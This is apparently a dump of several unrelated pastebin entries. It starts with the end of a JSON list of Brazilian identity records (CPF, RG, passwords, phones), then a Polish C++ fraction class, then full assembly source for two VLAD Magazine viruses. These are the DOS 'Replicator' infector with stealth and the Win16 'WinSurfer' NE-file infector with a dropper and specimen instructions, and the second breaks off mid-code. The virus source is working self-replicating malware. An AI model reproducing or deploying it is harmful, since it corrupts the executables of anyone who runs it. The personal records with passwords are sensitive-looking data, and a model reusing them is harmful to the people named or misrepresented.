		""telefone_fixo"": ""(31) 2973-0879"",
		""celular"": ""(31) 99773-0629"",
		""altura"": ""1,68"",
		""peso"": 96,
		""tipo_sanguineo"": ""B-"",
		""cor"": ""verde""
	},
	{
		""nome"": ""Pietro Martin Vicente da Costa"",
		""idade"": 18,
		""cpf"": ""663.057.266-12"",
		""rg"": ""17.627.668-3"",
		""data_nasc"": ""21/04/2005"",
		""sexo"": ""Masculino"",
		""signo"": ""Touro"",
		""mae"": ""Nina Sebastiana"",
		""pai"": ""Ian Enrico Raul da Costa"",
		""email"": ""pietro-dacosta91@paraisopolis.com.br"",
		""senha"": ""fm5CMbfgzk"",
		""cep"": ""32400-970"",
		""endereco"": ""Rua Otacílio Negrão de Lima 135 Lojas 2 e 3"",
		""numero"": 234,
		""bairro"": ""Centro"",
		""cidade"": ""Ibirité"",
		""estado"": ""MG"",
		""telefone_fixo"": ""(31) 3586-4049"",
		""celular"": ""(31) 98241-0866"",
		""altura"": ""1,97"",
		""peso"": 54,
		""tipo_sanguineo"": ""B+"",
		""cor"": ""verde""
	},
	{
		""nome"": ""Mateus Nicolas Nascimento"",
		""idade"": 18,
		""cpf"": ""571.470.656-03"",
		""rg"": ""16.162.099-1"",
		""data_nasc"": ""24/06/2005"",
		""sexo"": ""Masculino"",
		""signo"": ""Câncer"",
		""mae"": ""Fabiana Aurora"",
		""pai"": ""Rodrigo Fernando Kevin Nascimento"",
		""email"": ""mateus-nascimento89@proxion.com.br"",
		""senha"": ""z4LctuTBGs"",
		""cep"": ""32400-970"",
		""endereco"": ""Rua Otacílio Negrão de Lima 135 Lojas 2 e 3"",
		""numero"": 898,
		""bairro"": ""Centro"",
		""cidade"": ""Ibirité"",
		""estado"": ""MG"",
		""telefone_fixo"": ""(31) 3799-0336"",
		""celular"": ""(31) 98304-8433"",
		""altura"": ""1,97"",
		""peso"": 76,
		""tipo_sanguineo"": ""O+"",
		""cor"": ""vermelho""
	},
	{
		""nome"": ""Edson Kauê Rezende"",
		""idade"": 18,
		""cpf"": ""731.787.386-14"",
		""rg"": ""21.713.987-5"",
		""data_nasc"": ""03/07/2005"",
		""sexo"": ""Masculino"",
		""signo"": ""Câncer"",
		""mae"": ""Luiza Vitória"",
		""pai"": ""Otávio Ricardo Rezende"",
		""email"": ""edsonkauerezende@unidademovel.com"",
		""senha"": ""ixy2XUtjgu"",
		""cep"": ""32400-970"",
		""endereco"": ""Rua Otacílio Negrão de Lima 135 Lojas 2 e 3"",
		""numero"": 445,
		""bairro"": ""Centro"",
		""cidade"": ""Ibirité"",
		""estado"": ""MG"",
		""telefone_fixo"": ""(31) 2664-1490"",
		""celular"": ""(31) 99526-1143"",
		""altura"": ""1,77"",
		""peso"": 92,
		""tipo_sanguineo"": ""B-"",
		""cor"": ""laranja""
	},
	{
		""nome"": ""Tomás Felipe Costa"",
		""idade"": 18,
		""cpf"": ""708.197.976-93"",
		""rg"": ""39.718.904-7"",
		""data_nasc"": ""27/06/2005"",
		""sexo"": ""Masculino"",
		""signo"": ""Câncer"",
		""mae"": ""Rafaela Jennifer Ester"",
		""pai"": ""José João Costa"",
		""email"": ""tomasfelipecosta@dpi.indl.com.br"",
		""senha"": ""YKHPb2uTDq"",
		""cep"": ""32400-970"",
		""endereco"": ""Rua Otacílio Negrão de Lima 135 Lojas 2 e 3"",
		""numero"": 962,
		""bairro"": ""Centro"",
		""cidade"": ""Ibirité"",
		""estado"": ""MG"",
		""telefone_fixo"": ""(31) 3649-8007"",
		""celular"": ""(31) 99462-0455"",
		""altura"": ""1,61"",
		""peso"": 108,
		""tipo_sanguineo"": ""B-"",
		""cor"": ""vermelho""
	},
	{
		""nome"": ""Sérgio Leonardo Erick da Silva"",
		""idade"": 18,
		""cpf"": ""791.461.056-97"",
		""rg"": ""28.984.357-1"",
		""data_nasc"": ""20/01/2005"",
		""sexo"": ""Masculino"",
		""signo"": ""Capricórnio"",
		""mae"": ""Maya Bianca Priscila"",
		""pai"": ""Roberto Enzo Ricardo da Silva"",
		""email"": ""sergio.leonardo.dasilva@amoamar.com.br"",
		""senha"": ""LswtxthFlu"",
		""cep"": ""32400-970"",
		""endereco"": ""Rua Otacílio Negrão de Lima 135 Lojas 2 e 3"",
		""numero"": 869,
		""bairro"": ""Centro"",
		""cidade"": ""Ibirité"",
		""estado"": ""MG"",
		""telefone_fixo"": ""(31) 2716-0650"",
		""celular"": ""(31) 98304-8929"",
		""altura"": ""1,95"",
		""peso"": 88,
		""tipo_sanguineo"": ""O+"",
		""cor"": ""amarelo""
	}
]"
Uau47fkb,Untitled,MeehoweCK,C++,Tuesday 4th of July 2023 09:25:47 AM CDT,"#include <iostream>

using namespace std;

class Wymierna
{
    friend ostream& operator<<(ostream&, const Wymierna&);      // nagłówek zaprzyjaźnienia funkcji
    friend Wymierna operator+(const Wymierna& A, const Wymierna& B);
    friend Wymierna operator-(const Wymierna& A, const Wymierna& B);
    friend Wymierna operator*(const Wymierna& A, const Wymierna& B);
    friend Wymierna operator/(const Wymierna& A, const Wymierna& B);
private:
    int licznik;
    int mianownik;
    void skroc();
public:
    Wymierna();
    Wymierna(int a, int b);
    Wymierna(int calkowita);
    Wymierna(double ulamek);
    double wartosc() const;
    void print() const;
    int get_licznik() const { return licznik; }
    int get_mianownik() const { return mianownik; }
};

int nwd(int a, int b)
{
    if (a * b == 0)
        return 1;
    if (a < 0)
        a = -a;
    if (b < 0)
        b = -b;
    while (a != b)
    {
        if (a > b)
            a -= b;
        if (b > a)
            b -= a;
    }
    return a;
}

Wymierna::Wymierna(int a, int b) : licznik(a), mianownik(b) { skroc(); }

Wymierna::Wymierna(int calkowita) : Wymierna(calkowita, 1) {}

Wymierna::Wymierna() : Wymierna(0) {}

Wymierna::Wymierna(double ulamek)
{
    double l = ulamek;
    mianownik = 1;
    while (1.0 * static_cast<int>(l) / mianownik != ulamek)
    {
        l *= 10;
        mianownik *= 10;
    }
    licznik = static_cast<int>(l);
    skroc();
}

double Wymierna::wartosc() const
{
    return 1.0 * licznik / mianownik;
}

void Wymierna::print() const
{
    if (mianownik == 1)
        cout << licznik << endl;
    else
        cout << licznik << ""/"" << mianownik << endl;
}

ostream& operator<<(ostream& os, const Wymierna& liczba)
{
    if (liczba.mianownik == 1)
        os << liczba.licznik;
    else
        os << liczba.licznik << '/' << liczba.mianownik;
    return os;
}

Wymierna operator+(const Wymierna& A, const Wymierna& B)
{
    Wymierna wynik;
    wynik.licznik = A.licznik * B.mianownik + B.licznik * A.mianownik;
    wynik.mianownik = A.mianownik * B.mianownik;

    wynik.skroc();

    return wynik;
}

Wymierna operator*(const Wymierna& A, const Wymierna& B)
{
    Wymierna wynik;
    wynik.licznik = A.licznik * B.licznik;
    wynik.mianownik = A.mianownik * B.mianownik;
    wynik.skroc();
    return wynik;

}

Wymierna operator-(const Wymierna& A, const Wymierna& B)
{
    Wymierna wynik;
    wynik.licznik = A.licznik * B.mianownik - B.licznik * A.mianownik;
    wynik.mianownik = A.mianownik * B.mianownik;
    wynik.skroc();

    return wynik;
}

Wymierna operator/(const Wymierna& A, const Wymierna& B)
{
    Wymierna wynik;
    wynik.licznik = A.licznik * B.mianownik;
    wynik.mianownik = A.mianownik * B.licznik;
    wynik.skroc();

    return wynik;
}



void Wymierna::skroc()
{
    int dzielnik = nwd(licznik, mianownik);
    licznik /= dzielnik;
    mianownik /= dzielnik;
    if (mianownik < 0)
    {
        licznik = -licznik;
        mianownik = -mianownik;
    }
}




int main()
{
    const Wymierna ulamek(8, 4);
    Wymierna B(1, -3);
    cout << ulamek << endl;
    cout << B << endl;

    cout << ulamek << "" + "" << B << "" = "" << ulamek + B << endl;

    Wymierna C{ ulamek + B };       // nowszy sposób inicjalizacji obiektu

    cout << 7.3 + C << endl;
    cout << ulamek - B << endl;
    cout << ulamek * B << endl;
    cout << ulamek / B << endl;

    cout << 1.5 > C << endl;
    cout << ulamek += 2.4 << endl;
    cout << 2.5 == ulamek << endl;



    return 0;
}"
ACNykZk7,VLAD Magazine - Issue #4 - ARTICLE.5_1 - Replicator,FlyFar,ASM (NASM),Tuesday 4th of July 2023 09:25:33 AM CDT,";                             Darkman/VLAD
;                           Proudly Presents
;                         R E P L I C A T O R
;              - Thanks to Bugsy/OBSESSiON for the help -

replicator   segment
             assume  cs:replicator,ds:replicator,es:replicator
             org     00h

code:
             call    viruscode
viruscode:
             pop     bp                  ; Load BP from stack
             sub     bp,offset viruscode ; BP = delta offset

             push    ds                  ; Save DS at stack
             push    es                  ; Save ES at stack

             mov     ax,6304h            ; Replicator service
             int     21h                 ; Do it!
             cmp     ax,bx               ; Already resident?
             je      repexit             ; Equal? Jump to repexit

             mov     ax,es
             dec     ax                  ; Decrease AX
             mov     ds,ax               ; DS = segment of programs MCB

             cmp     byte ptr ds:[00h],'Z'
             jne     repexit             ; Not last in chain? Jump to repexit
             sub     word ptr ds:[03h],(memoryend-code+0fh)/10h
             sub     word ptr ds:[12h],(memoryend-code+0fh)/10h
             add     ax,ds:[03h]         ; AX = MCB + size of memory block
             inc     ax                  ; AX = first usable MCB segment

             cld                         ; Clear direction flag
             push    cs                  ; Save CS at stack
             pop     ds                  ; Load DS from stack (CS)
             mov     es,ax               ; ES = first usable program segment
             mov     cx,(codeend-code)   ; Move 651 bytes
             xor     di,di               ; Clear DI
             lea     si,[bp+code]        ; SI = offset of code
             rep     movsb               ; Move virus to high memory

             xor     ax,ax               ; Clear AX
             mov     ds,ax               ; DS = segment of interrupt table
             xchg    ax,ds:[21h*04h]     ; Load and store offset of INT 21h
             mov     es:[int21off],ax    ; Store offset of INT 21h
             mov     ax,1eh              ; AX = segment of hole in memory
             xchg    ax,ds:[21h*04h+02h] ; Load and store segment of INT 21h
             mov     es:[int21seg],ax    ; Store segment of INT 21h

             mov     byte ptr ds:[1e0h],0eah
             mov     word ptr ds:[1e1h],offset virusint21
             mov     ds:[1e3h],es        ; Store segment of virusint21
repexit:
             pop     es                  ; Load ES from stack
             pop     ds                  ; Load DS from stack

             mov     ax,es
             add     ax,10h              ; Beginning of EXE file
             add     word ptr cs:[bp+csip+02h],ax

             cli                         ; Clear interrupt-enable flag
             mov     sp,word ptr cs:[bp+sssp]
             add     ax,word ptr cs:[bp+sssp+02h]
             mov     ss,ax
             sti                         ; Store interrupt-enable flag

             xor     ax,ax               ; Clear AX
             mov     bx,ax               ; Clear BX
             mov     cx,ax               ; Clear CX
             mov     dx,ax               ; Clear DX
             mov     di,ax               ; Clear DI
             mov     si,ax               ; Clear SI
             mov     bp,ax               ; Clear BP
             jmp     $+02h               ; Flush prefetch queue

             db      0eah                ; Object code of jump far
csip         dd      0fff00000h          ; CS:IP of infected file
sssp         dd      ?                   ; SS:SP of infected file

virusint21   proc    near                ; Interrupt 21h of Replicator
             cmp     ax,6304h            ; Replicator service?
             je      repservice          ; Equal? Jump to repservice
             cmp     ah,0eh              ; Select default drive?
             je      setupfind           ; Equal? Jump to setupfind
             cmp     ah,3bh              ; Change directory?
             je      setupfind           ; Equal? Jump to setupfind
             cmp     ah,4eh              ; Find first matching file (DTA)?
             je      dtastealth          ; Equal? Jump to dtastealth
             cmp     ah,4fh              ; Find next matching file (DTA)?
             je      dtastealth          ; Equal? Jump to dtastealth
             cmp     ah,11h              ; Find first matching file (FCB)?
             je      fcbstealth          ; Equal? Jump to fcbstealth
             cmp     ah,12h              ; Find next matching file (FCB)?
             je      fcbstealth          ; Equal? Jump to fcbstealth
             jmp     int21exit
setupfind:
             popf                        ; Load flags from stack
             pushf                       ; Save falgs at stack

             call    simint21

             push    ax                  ; Save AX at stack
             push    bx                  ; Save BX at stack
             push    cx                  ; Save CX at stack
             push    dx                  ; Save DX at stack
             push    di                  ; Save DI at stack
             push    si                  ; Save SI at stack
             push    ds                  ; Save DS at stack
             push    es                  ; Save ES at stack
             pushf                       ; Save flags at stack

             mov     ah,2fh              ; Get disk transfer address
             call    simint21            ; Do it!
             push    bx                  ; Save BX at stack
             push    es                  ; Save ES at stack

             mov     ah,1ah              ; Set disk transfer address
             lea     dx,dta              ; DX = offset of dta
             push    cs                  ; Save CS at stack
             pop     ds                  ; Load DS from stack (CS)
             call    simint21            ; Do it!

             mov     ah,4eh              ; Find first matching file (DTA)
             mov     cx,27h              ; Set file attribute
             lea     dx,filespec         ; DX = offset of filespec
findnext:
             call    simint21            ; Do it!
             jc      nomorefiles         ; Error? Jump to nomorefiles

             cmp     filedate,0022h      ; Allready infected?
             je      dontinfect          ; Equal? Jump to dontinfect

             call    infectfile
dontinfect:
             mov     ah,4fh              ; Find next matching file (DTA)
             jmp     findnext
nomorefiles:
             pop     ds                  ; Load DS from stack
             pop     dx                  ; Load DX from stack
             mov     ah,1ah              ; Set disk transfer address
             call    simint21            ; Do it!

             popf                        ; Load flags from stack
             pop     es                  ; Load ES from stack
             pop     ds                  ; Load DS from stack
             pop     si                  ; Load SI from stack
             pop     di                  ; Load DI from stack
             pop     dx                  ; Load DX from stack
             pop     cx                  ; Load CX from stack
             pop     bx                  ; Load BX from stack
             pop     ax                  ; Load AX from stack

             retf    02h                 ; Return far and pop a word!
int21exit:
             jmp     dword ptr cs:int21off
repservice:
             mov     bx,ax
             iret                        ; Interrupt return!
dtastealth:
             call    simint21
             pushf                       ; Save flags at stack
             jc      stealthexit         ; Error? Jump to stealthexit

             push    ax                  ; Save AX at stack
             push    bx                  ; Save BX at stack
             push    es                  ; Save ES at stack

             mov     ah,2fh              ; Get disk transfer address
             call    simint21

             cmp     word ptr es:[bx+18h],0022h
             jne     dontstealth         ; Not equal? Jump to dontstealth

             add     bx,1ah              ; BX = offset of file size
             jmp     stealth
fcbstealth:
             call    simint21
             pushf                       ; Save flags at stack
             or      al,al               ; File name match found?
             jne     stealthexit         ; Not equal? Jump to stealthexit

             push    ax                  ; Save AX at stack
             push    bx                  ; Save BX at stack
             push    es                  ; Save ES at stack

             mov     ah,2fh              ; Get disk transfer address
             call    simint21

             cmp     byte ptr es:[bx],0ffh
             jne     notextended         ; Not equal? Jump to notextended

             add     bx,07h              ; SI = offset of normal FCB
notextended:
             cmp     word ptr es:[bx+19h],0022h
             jne     dontstealth         ; Not equal? Jump to dontstealth

             add     bx,1dh              ; BX = offset of file size
stealth:
             sub     es:[bx],(codeend-code)
             sbb     word ptr es:[bx],00h
dontstealth:
             pop     es                  ; Load ES from stack
             pop     ax                  ; Load AX from stack
             pop     bx                  ; Load BX from stack
stealthexit:
             popf                        ; Load flags from stack

             retf    02h                 ; Return far and pop a word!
             endp

infectfile   proc    near                ; Infect a EXE file
             xor     ax,ax               ; Clear AX
             mov     ds,ax               ; DS = segment of interrupt table
             push    ds:[24h*04h]        ; Save INT 24h offset at stack
             push    ds:[24h*04h+02h]    ; Save INT 24h segment at stack
             mov     word ptr ds:[24h*04h],offset virusint24
             mov     ds:[24h*04h+02h],cs ; Intercept interrupt 24h

             mov     ax,3d00h            ; Open file (read)
             lea     dx,filename         ; DX = offset of filename
             push    cs                  ; Save CS at stack
             pop     ds                  ; Load DS from stack (CS)
             call    simint21            ; Do it!

             xchg    ax,bx               ; Exchange AX with BX

             mov     ax,1220h            ; Get system file table number
             int     2fh                 ; Do it! (multiplex)

             push    bx                  ; Save BX at stack
             mov     ax,1216h            ; Get address of system FCB
             mov     bl,es:[di]          ; BL = system file table entry
             int     2fh                 ; Do it! (multiplex)
             pop     bx                  ; Load BX from stack

             mov     byte ptr es:[di+02h],02h

             mov     ah,3fh              ; Read from file
             mov     cx,19h              ; Read 25 bytes
             lea     dx,exeheader        ; DX = offset of exeheader
             mov     si,dx
             call    simint21            ; Do it!

             cmp     word ptr [si],'MZ'  ; EXE file?
             je      infect              ; Equal? Jump to infect
             cmp     word ptr [si],'ZM'  ; EXE file?
             je      infect              ; Equal? Jump to infect
             jmp     closefile
infect:
             mov     ax,4202h            ; Move file pointer to the end
             cwd                         ; Clear DX
             mov     cx,dx               ; Clear CX
             call    simint21            ; Do it!

             push    bx                  ; Save BX at stack
             mov     bx,ax
             mov     cx,dx

             cmp     word ptr [si+02h],00h
             je      dontdecpage         ; Equal? Jump to dontdecpage

             dec     word ptr [si+04h]   ; Decrease pages in file
dontdecpage:
             mov     ax,200h
             mul     word ptr [si+04h]   ; Divide by pages
             add     ax,[si+02h]         ; Add bytes on last page
             adc     dx,00h              ; Convert to 32 bit

             cmp     ax,bx               ; Internal overlay?
             pop     bx                  ; Load bytes from stack
             jne     closefile           ; Not equal? Jump to closefile
             cmp     cx,dx               ; Internal overlay?
             jne     closefile           ; Not equal? Jump to closefile

             cmp     byte ptr [si+18h],40h
             je      closefile           ; Windows file? Jump to closefile

             push    ax                  ; Save AX at stack
             push    dx                  ; Save DX at stack

             push    si                  ; Save SI at stack

             push    cs                  ; Save CS at stack
             pop     es                  ; Load ES from stack (CS)

             add     si,0eh              ; SI = offset of SS:SP
             lea     di,sssp             ; DI = offset of sssp

             movsw                       ; Store original SP
             movsw                       ; Store original SS

             inc     si                  ; SI = offset of CS:IP \
             inc     si                  ; ""  ""   ""    ""    ""   /
             lea     di,csip             ; DI = offset of csip

             movsw                       ; Store original IP
             movsw                       ; Store original CS

             pop     si                  ; Load SI from stack

             mov     cx,10h
             div     cx                  ; Convert bytes to paragraphs

             sub     ax,word ptr [si+08h]

             mov     word ptr [si+14h],dx
             mov     word ptr [si+16h],ax

             add     ax,(memoryend-code+0fh)/10h

             mov     word ptr [si+0eh],ax

             pop     dx                  ; Load DX from stack
             pop     ax                  ; Load AX from stack

             add     ax,(codeend-code)   ; Add the length of the virus
             adc     dx,00h              ; Convert to 32 bit

             mov     cx,200h
             div     cx                  ; Divide by pages

             or      dx,dx               ; No bytes on last page?
             je      dontincpage         ; Equal? Jump to dontincpage

             inc     ax                  ; Increase AX
dontincpage:
             mov     word ptr [si+04h],ax
             mov     word ptr [si+02h],dx

             mov     ah,40h              ; Write to file
             mov     cx,(codeend-code)   ; Write 651 bytes
             cwd                         ; DX = offset of code
             call    simint21            ; Do it!

             mov     ax,4200h            ; Move file pointer to the beginning
             cwd                         ; Clear DX
             mov     cx,dx               ; Clear CX
             call    simint21            ; Do it!

             mov     ah,40h              ; Write to file
             mov     cx,18h              ; Write 29 bytes
             mov     dx,si               ; DX = offset of exeheader
             call    simint21            ; Do it!

             mov     ax,5701h            ; Set file's date and time
             mov     cx,filetime         ; Restore original file time
             mov     dx,0022h            ; Set infection marker
             call    simint21            ; Do it!
closefile:
             mov     ah,3eh              ; Close file
             call    simint21            ; Do it!

             xor     ax,ax               ; Clear AX
             mov     es,ax               ; ES = segment of interrupt table
             pop     es:[24h*04h]        ; Save INT 24h offset at stack
             pop     es:[24h*04h+02h]    ; Save INT 24h segment at stack

             ret                         ; Return!
             endp

virusint24   proc    near                ; Interrupt 24h of Replicator
             mov     al,3                ; Fail system call in progress
             iret                        ; Interrupt return!
             endp

simint21     proc    near                ; Simulate interrupt 21h
             pushf                       ; Save flags at stack
callfar      db      9ah                 ; Object code of a far call
int21off     dw      ?                   ; Offset of interrupt 21h
int21seg     dw      ?                   ; Segment of interrupt 21h
             ret                         ; Return!
             endp

filespec     db      '*.EXE',00h         ; File specification
virusname    db      '[Replicator] '     ; Name of the virus
virusauthor  db      '[Darkman/VLAD]'    ; Author of the virus
codeend:
exeheader    db      19h dup(?)          ; EXE header
dta:
             db      15h dup(?)          ; Used by DOS for find next-process
fileattr     db      ?                   ; File attribute
filetime     dw      ?                   ; File time
filedate     dw      ?                   ; File date
filesize     dd      ?                   ; File size
filename     db      0dh dup(?)          ; File name
memoryend:

replicator   ends
end          code"
7k5CfBKS,VLAD Magazine - Issue #4 - Article.4_3 - Virus.Win16.Winsurfer - Source Code,FlyFar,ASM (NASM),Tuesday 4th of July 2023 09:23:56 AM CDT,";-------------------------------------------------------------------------
;
;       WinSurfer Virus (c) 1995 VLAD incorporated.
;               Written by qark and quantum.
;
;  This virus is a parasitic TSR infector of NewEXE files.  It works in 
;  protected mode only and infects on file execute.
;
;  The executable infection code is by qark, while the interrupt handler
;  code is by quantum.
;
;  This virus contains no stealth of any form, a simple readonly attribute
;  will stop the virus from writing, the time/date stamp is not preserved
;  and there is no encryption of any form.  Windows users are too dumb to
;  notice anyway.
;
;  To obtain a specimen of the virus, copy the compiled com file into the
;  same directory as the file WINMINE.EXE and run it.  Go into Windows
;  and run the game 'Minesweeper'.  Minesweeper should infect program
;  manager direct action, so that next time windows is booted the virus
;  will be resident.
;
;  Possible Bugs and Improvements:
;   1) An error may be that if the file isn't exactly shift alignment sized
;   the virus will overwrite some data at the end of the file or be
;   incorrectly pointed.
;   2) An error may occur if the end of the segment table is less than eight
;   bytes from a 512 byte divisor.
;   3) It may be possible to allocate buffer space without adding to virus
;   size by changing the segment memory size in the segment table. At the
;   moment the virus size is being doubled by the 512 byte read buffer we
;   include in the disk image.
;
;  Although the final virus was coded completely by quantum and I, many
;  people helped by offering ideas, and windows documentation so I
;  must give thanks to the following people:
;  Screaming Radish, Stalker X, Dreadlord and some scandinavian dude.
;  The most important help came from Malware who taught me the relocation
;  entry ffff trick.
;
;  Assemble with a86.
;-------------------------------------------------------------------------


;--Directly below is dropper code, ignore it, page down to the virus code--

        mov     ax,3d02h
        mov     dx,offset fname
        int     21h
        xchg    bx,ax
        
        mov     ah,3fh
        mov     cx,512
        mov     dx,offset buffer
        int     21h

        mov     si,offset buffer
        cmp     word ptr [si+3ch],400h
        je      ok_dropper
        int     20h
ok_dropper:
        mov     ax,word ptr [si+2]
        mov     word ptr ppage,ax
        mov     ax,word ptr [si+4]
        mov     word ptr pfile,ax

        mov     ax,4200h
        xor     cx,cx
        cwd
        int     21h

        mov     ah,40h
        mov     cx,offset setsp - offset header
        mov     dx,offset header
        int     21h

        mov     ax,4200h
        xor     cx,cx
        mov     dx,word ptr [si+3ch]
        int     21h

        mov     ah,3fh
        mov     cx,512
        mov     dx,offset buffer
        int     21h

        mov     ax,word ptr [si+1ch]
        inc     word ptr [si+1ch]       ;increase segment count
        mov     cl,8
        mul     cl
        
        mov     di,word ptr [si+22h]
        add     di,si
        add     di,ax

        mov     ax,4202h
        xor     cx,cx
        cwd
        int     21h
        
        ;write in the new segment into the table
        
        mov     cl,byte ptr [si+32h]
        push    bx
        mov     bx,1
        shl     bx,cl
        mov     cx,bx
        pop     bx
        div     cx

        mov     word ptr [di],ax
        mov     word ptr [di+2],winend-win_entry
        mov     word ptr [di+4],180h
        mov     word ptr [di+6],winend-win_entry

        mov     ax,word ptr [si+14h]
        mov     word ptr winip2,ax

        mov     word ptr [si+14h],0

        mov     ax,word ptr [si+16h]
        mov     word ptr wincs2,ax
        mov     ax,word ptr [si+1ch]    ;new cs:ip
        mov     word ptr [si+16h],ax

        mov     ah,40h
        mov     cx,winend-win_entry + 20h
        mov     dx,offset win_entry
        int     21h

        add     word ptr [si+4],512

        add     word ptr [si+24h],512
        add     word ptr [si+26h],512
        add     word ptr [si+28h],512
        add     word ptr [si+2ah],512

        mov     dx,512
        mov     ax,4200h
        xor     cx,cx
        int     21h
        
        mov     ah,40h
        mov     cx,512
        mov     dx,offset buffer
        int     21h
        
        mov     ah,3eh
        int     21h

        int     20h

;--The New Windows DOS stub--
header  db      'MZ'
ppage   dw      0       ;part page
pfile   dw      0       ;file/512
        dw      0       ;relocation items
        dw      10h     ;header size/16
        dw      0       ;minmem
        dw      -1      ;maxmem
        dw      0       ;SS
        dw      offset setsp - offset winstart ;SP
        dw      0       ;checksum
        dw      0       ;IP
        dw      0       ;CS
        dw      40h     ;Relocation offset
        dupsize1        equ 3ch - ($-offset header)
        db      dupsize1 dup (0)
        dw      200h    ;NE offset
        dupsize2        equ 100h - ($-offset header)
        db      dupsize2 dup (0)
winstart:
        call    windowsmsg
        db      'This program requires Microsoft Windows.',0dh,0ah,'$'
windowsmsg:
        pop     dx
        push    cs
        pop     ds
        mov     ah,9
        int     21h
        mov     ax,4c01h
        int     21h
        db      100 dup (0)
setsp:
;---end of fake dropper dos stub--

fname   db      'winmine.exe',0


;----Start of the Virus---All the above is the dropper code, ignore it-------

win_entry:                      ;Infected windows executables start here.
        jmp     realenter

int21start:                             ;Virus Int21 handler

        cmp     ax,1894h                ;Residency test ?
        jnz     nottest
        mov     cx,1234h
        iret
nottest:

        pusha
        push    ds
        push    es

        cmp     ah,4bh                  ;Windows is so dumb it uses DOS to
                                        ;execute.
        jnz     return2int
        call    executing

return2int:

        pop     es
        pop     ds
        popa

        db      0eah
oldint21        dw      0,0

executing:
        
        mov     ax,3d02h                ;Open file in DS:DX
        int     21h
        jnc     ok_open
        ret
ok_open:
        push    ax
        mov     ax,0ah                  ;This function makes our CS writable.
        push    cs
        pop     bx
        int     31h
        push    ax
        pop     ds
        pop     bx

        mov     ah,3fh                  ;Read first 512 bytes of EXE header.
        mov     cx,512
        mov     dx,offset buffer-offset win_entry
        int     21h

        mov     si,offset buffer-offset win_entry

        cmp     word ptr [si],'ZM'      ;Not a COM file.
        jne     bad_open
        cmp     word ptr [si+18h],40h           ;40h+ for NE exe's
        jb      bad_open
        cmp     word ptr [si+3ch],400h          ;header will be below if
        je      fileisoktoinfect                ;already infected...
bad_open:
        jmp     fileisunsuitable

fileisoktoinfect:
        sub     word ptr [si+3ch],8     ;Change NE pointer.
        sub     word ptr [si+10h],8     ;Incase stack is end of header
         
        mov     ax,4200h                ;Lseek right back to the start.
        xor     cx,cx
        cwd
        int     21h

        mov     ah,40h                  ;Rewrite the modified DOS header.
        mov     cx,512
        mov     dx,offset buffer - offset win_entry
        int     21h
        jc      bad_open                ;Write fail.. outta here!

        mov     ax,4200h                ;Lseek to NE header.
        xor     cx,cx
        mov     dx,400h
        int     21h

        mov     ah,3fh                  ;Read in first 512 bytes.
        mov     cx,512
        mov     dx,offset buffer - offset win_entry
        int     21h

        ;Adjust header offsets.  Any tables behind the segment table will 
        ;have their offset increased by eight because we are inserting a new
        ;eight byte segment entry.

        mov     ax,word ptr [si+22h]    ;AX=Segment table offset.
        cmp     word ptr [si+4],ax
        jb      ok_et
        add     word ptr [si+4],8
ok_et:
        cmp     word ptr [si+24h],ax
        jb      ok_rt
        add     word ptr [si+24h],8
ok_rt:
        cmp     word ptr [si+26h],ax
        jb      ok_rnt
        add     word ptr [si+26h],8
ok_rnt:
        cmp     word ptr [si+28h],ax
        jb      ok_mrt
        add     word ptr [si+28h],8
ok_mrt:
        cmp     word ptr [si+2ah],ax
        jb      ok_int
        add     word ptr [si+2ah],8
ok_int:
        
        mov     ax,word ptr [si+1ch]
        inc     word ptr [si+1ch]       ;Increase segment count.
        mov     cl,8                    ;Assume less than 256 segments.
        mul     cl

        add     ax,word ptr [si+22h]    ;AX=Size of segment table.
        xor     dx,dx                   ;High order division value.
        mov     cx,512                  ;512 byte portions are used
                                        ; for the reads later on.
        div     cx

        mov     word ptr [offset ne_size-offset win_entry],ax 
                                        ;How much we'll have to read.
        mov     word ptr [offset last_ne-offset win_entry],dx
                                        ;Where the end of the segment table
                                        ; will be when we read it into the
                                        ; buffer. (The last buffer)

        ;Put the original CS:IP into our relocation table.
        push    word ptr [si+14h]
        pop     word ptr [offset newwinip2 - offset win_entry]
        push    word ptr [si+16h]
        pop     word ptr [offset newwincs2 - offset win_entry]

        ;Save the alignment shift count because we need that for calculating
        ;the offset of our segment when writing the segment entry.
        push    word ptr [si+32h]
        pop     word ptr [offset al_shift - offset win_entry]

        ;Point CS:IP to the virus.
        mov     word ptr [si+14h],0     ;The new IP
        mov     ax,word ptr [si+1ch]
        mov     word ptr [si+16h],ax    ;The new CS

        ;Initialise the lseek variable
        mov     word ptr [offset lseek-offset win_entry],400h

        ;The below code gets the NE header and keeps moving it forward by
        ;eight bytes in 512 byte chunks.
move_header_forward:        
        mov     ax,word ptr [offset ne_size-offset win_entry]
        or      ax,ax
        jz      last_page

        dec     word ptr [offset ne_size-offset win_entry]

        mov     ax,4200h                ;Lseek to our current position.
        xor     cx,cx
        mov     dx,word ptr [offset lseek-offset win_entry]
        sub     dx,8
        int     21h
        
        mov     ah,40h                  ;Write the header section out.
        mov     cx,512
        mov     dx,si
        int     21h
        
                                        ;Advance the pointer by 512.
        add     word ptr [offset lseek-offset win_entry],512
        
        mov     ax,4200h                ;Lseek to the next chunk.
        xor     cx,cx
        mov     dx,word ptr [offset lseek-offset win_entry]
        int     21h

        mov     ah,3fh                  ;Read it.
        mov     dx,offset buffer - offset win_entry
        mov     cx,512
        int     21h

        jmp     move_header_forward

last_page:
        mov     ax,4202h                ;Lseek to end of file.
        xor     cx,cx
        cwd
        int     21h                     ;File length into DX:AX

        ;DX:AX=File offset of our segment
        ;Below section shifts the segment offset right by the alignment
        ;shift value.
        mov     cl,byte ptr [offset al_shift - offset win_entry]
        push    bx
        mov     bx,1
        shl     bx,cl
        mov     cx,bx
        pop     bx
        div     cx

        mov     di,si
        add     di,word ptr [offset last_ne-offset win_entry]

        ;Adding the new segment table entry
        mov     word ptr [di],ax        ;Segment offset
        mov     word ptr [di+2],offset winend-offset win_entry
        mov     word ptr [di+4],180h    ;Segment attribute
                                        ; 180h = NonMovable + Relocations
        mov     word ptr [di+6],offset winend-offset win_entry
        
        mov     ax,4200h        ;Lseek to next position.
        xor     cx,cx
        mov     dx,word ptr [offset lseek-offset win_entry]
        sub     dx,8
        int     21h
        
        mov     ah,40h          ;Write rest of NE header + new seg entry.
        mov     cx,word ptr [offset last_ne-offset win_entry]
        add     cx,8            ;Added segment entry means eight more.
        mov     dx,offset buffer - offset win_entry
        int     21h

        ;Reset the relocatable pointer.
        push    word ptr [offset winip - offset win_entry]
        push    word ptr [offset wincs - offset win_entry]
        mov     word ptr [offset winip - offset win_entry],0
        mov     word ptr [offset wincs - offset win_entry],0ffffh

        mov     ax,4202h        ;Lseek to end of file.
        xor     cx,cx
        cwd
        int     21h
